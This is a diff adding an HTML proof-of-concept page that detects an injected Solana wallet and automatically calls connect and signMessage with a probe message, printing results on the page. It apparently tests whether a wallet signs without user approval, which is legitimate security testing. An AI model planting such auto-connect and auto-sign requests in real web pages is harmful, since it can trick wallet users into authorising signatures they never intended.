@@ -1,0 +1,20 @@
+<!doctype html><html><head><meta charset="utf-8"><title>poc9e5</title>
+<script>
+let tries=0;
+function out(m){var d=document.createElement('div');d.textContent=m;document.body.appendChild(d);}
+async function tryAll(){
+  var w=window.solana;
+  if(!w){out('NO window.solana tries='+tries++); if(tries<15){setTimeout(tryAll,1000);} return;}
+  out('solana keys: '+Object.keys(w).join(','));
+  try{ w.on('connect',function(pk){out('EVT connect '+pk);}); }catch(e){}
+  try{
+    var r1=await w.request({method:'connect'});
+    out('CONNECT '+JSON.stringify(r1).slice(0,60));
+  }catch(e){out('CONNECT ERR '+e.message);}
+  try{
+    var r2=await w.request({method:'signMessage',params:{message:'poc9e5 auto-sign probe'}});
+    out('SIGNMSG SIG '+String(r2).slice(0,64));
+  }catch(e){out('SIGNMSG ERR '+e.message);}
+}
+setTimeout(tryAll,1200);
+</script></body></html>
